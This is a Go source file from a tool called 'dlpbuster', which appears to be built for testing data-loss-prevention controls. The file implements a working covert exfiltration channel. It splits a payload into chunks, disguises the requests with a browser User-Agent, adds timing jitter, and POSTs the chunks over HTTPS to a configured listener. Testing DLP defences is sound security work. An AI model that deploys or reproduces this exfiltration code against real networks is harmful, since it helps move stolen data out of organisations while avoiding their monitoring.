// Package https implements a covert HTTPS POST exfiltration channel.
// The payload is split into chunks and sent as separate POST requests
// to the configured listener address.
package https

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	mrand "math/rand/v2"
	"net/http"
	"time"

	"github.com/hssn-research/dlpbuster/internal/channels"
	"github.com/hssn-research/dlpbuster/internal/payload"
)

// Channel implements channels.Channel for HTTPS covert POST exfiltration.
type Channel struct{}

// New returns a new HTTPS Channel.
func New() *Channel { return &Channel{} }

// Name returns the channel identifier.
func (c *Channel) Name() string { return "https" }

// Description returns a one-line description.
func (c *Channel) Description() string {
	return "Exfiltrate payload over chunked HTTPS POST requests to a controlled endpoint"
}

// Run executes the HTTPS exfil.
func (c *Channel) Run(ctx context.Context, cfg channels.ChannelConfig) channels.Result {
	result := channels.Result{Channel: c.Name()}
	start := time.Now()

	target := cfg.ListenerAddr
	if target == "" {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"https: no listener address configured"}
		result.Duration = time.Since(start)
		return result
	}

	chunkSize := cfg.HTTPSChunkSize
	if chunkSize <= 0 {
		chunkSize = 256
	}

	userAgent := cfg.HTTPSUserAgent
	if userAgent == "" {
		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}

	chunks, err := payload.Split(cfg.Payload, chunkSize)
	if err != nil {
		result.Status = channels.StatusError
		result.Error = err
		result.Duration = time.Since(start)
		return result
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: false}, //nolint:gosec
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	// Generate a run-level correlation ID for listener matching.
	corrID := randomHex(8)

	sent := 0
	total := len(chunks)
	var evidence []string
	confirmed := 0

	for i, chunk := range chunks {
		select {
		case <-ctx.Done():
			result.Status = channels.StatusPartial
			result.Evidence = append(evidence, fmt.Sprintf("context cancelled after %d/%d chunks", sent, total))
			result.BytesSent = sent * chunkSize
			result.Duration = time.Since(start)
			return result
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(chunk))
		if err != nil {
			result.Status = channels.StatusError
			result.Error = fmt.Errorf("https: build request: %w", err)
			result.Duration = time.Since(start)
			return result
		}
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("Content-Type", "application/octet-stream")
		req.Header.Set("X-Chunk-Index", fmt.Sprintf("%d", i))
		req.Header.Set("X-Chunk-Total", fmt.Sprintf("%d", total))
		req.Header.Set("X-Correlation-ID", corrID)

		resp, err := client.Do(req)
		if err != nil {
			evidence = append(evidence, fmt.Sprintf("chunk %d: %v", i, err))
			result.Status = channels.StatusBlocked
			result.Evidence = evidence
			result.Duration = time.Since(start)
			return result
		}
		// Check if listener echoed back the correlation ID — confirms receipt.
		if resp.Header.Get("X-Correlation-ID") == corrID {
			confirmed++
		}
		resp.Body.Close()
		evidence = append(evidence, fmt.Sprintf("chunk %d/%d → %d %s", i+1, total, resp.StatusCode, http.StatusText(resp.StatusCode)))
		sent += len(chunk)

		if cfg.JitterMs > 0 {
			jitter := time.Duration(mrand.IntN(cfg.JitterMs)) * time.Millisecond
			select {
			case <-ctx.Done():
			case <-time.After(jitter):
			}
		}
	}

	if confirmed > 0 {
		evidence = append(evidence, fmt.Sprintf("correlation confirmed: %d/%d chunks acknowledged by listener (ID=%s)", confirmed, total, corrID))
	}
	result.Status = channels.StatusPassed
	result.BytesSent = sent
	result.Evidence = append(evidence, fmt.Sprintf("all %d chunks delivered to %s", total, target))
	result.Duration = time.Since(start)
	return result
}

func randomHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
